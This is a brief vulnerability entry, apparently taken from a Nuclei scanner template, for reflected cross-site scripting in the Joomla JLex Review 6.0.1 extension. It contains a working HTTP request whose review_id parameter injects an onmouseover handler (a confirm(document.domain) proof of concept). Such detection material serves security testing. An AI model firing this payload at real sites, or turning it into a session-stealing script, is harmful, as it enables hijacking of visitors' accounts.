# Vulnerability: Joomla JLex Review 6.0.1 - Cross-Site Scripting
**Classification:** JOOMLA
**Source:** Nuclei Template (`joomla-jlex-review-xss.yaml`)

## Description
The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/?review_id=1&itwed%22onmouseover=%22confirm(document.domain)%22style=%22position:absolute%3bwidth:100%25%3bheight:100%25%3btop:0%3bleft:0%3b%22b7yzn=1
```

